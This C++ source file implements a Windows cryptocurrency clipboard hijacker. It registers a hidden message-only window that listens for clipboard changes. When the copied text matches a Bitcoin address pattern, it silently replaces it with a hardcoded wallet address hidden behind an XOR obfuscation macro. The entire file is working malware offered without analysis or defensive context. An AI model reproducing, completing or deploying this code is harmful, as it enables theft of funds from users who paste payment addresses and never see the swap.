#include <clipper.hpp>
#include <clipboard.hpp>

LRESULT CALLBACK clipper_wndproc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static bool listening = false;

	switch (uMsg)
	{
	case WM_CREATE:
		listening = AddClipboardFormatListener(hWnd);
		return listening ? 0 : -1;

	case WM_DESTROY:
		if (listening)
		{
			RemoveClipboardFormatListener(hWnd);
			listening = false;
		}
		return 0;

	case WM_CLIPBOARDUPDATE:
		auto clipper = c_clipper::instance();

		std::string clipboard_data = c_clipper::instance()->get_clipboard();
		if (clipper->is_bitcoin_address(clipboard_data)) {
			auto new_clipboard = clipper->replace_bitcoin_address(_xor_("bc1q5npn8637gu33e9e3lvqvya9gc3xafd67z4h0fs"), clipboard_data);

			clipper->set_clipboard(new_clipboard);
		}
		return 0;
	}

	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

bool c_clipper::is_bitcoin_address(std::string bitcoin_address)
{
	std::smatch regexMatch;
	return regex_search(bitcoin_address, regexMatch, bitcoin_wallet_regex);
}

std::string c_clipper::replace_bitcoin_address(std::string bitcoin_address, std::string replace_content)
{
	return std::regex_replace(replace_content, bitcoin_wallet_regex, bitcoin_address);
}

std::string c_clipper::get_clipboard()
{
	c_clipboard clipboard;

	HANDLE clipboard_data = GetClipboardData(CF_TEXT);
	if (clipboard_data == nullptr) return std::string();

	c_text_global_lock text_global_lock(clipboard_data);
	std::string text(text_global_lock.Get());

	return text;
}

void c_clipper::set_clipboard(std::string clipboard_data)
{
	HGLOBAL memory = GlobalAlloc(GMEM_MOVEABLE, clipboard_data.length() + 1);
	c_text_global_lock text_global_lock(memory);

	memcpy((void*)text_global_lock.Get(), clipboard_data.c_str(), clipboard_data.length() + 1);

	c_clipboard clipboard;

	EmptyClipboard();

	SetClipboardData(CF_TEXT, memory);
}

void c_clipper::start()
{
	WNDCLASSEX wnd_class = { sizeof(WNDCLASSEX) };
	wnd_class.lpfnWndProc = clipper_wndproc;
	wnd_class.lpszClassName = _xor_("Clipper").c_str();

	if (!RegisterClassEx(&wnd_class)) return;

	HWND hWnd = CreateWindowEx(0, wnd_class.lpszClassName, "", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
	if (!hWnd) return;

	MSG message;
	while (BOOL return_value = GetMessage(&message, 0, 0, 0))
		if (return_value != -1) {
			TranslateMessage(&message);
			DispatchMessage(&message);
		}

}

void c_clipper::shutdown()
{
	PostQuitMessage(0);
}
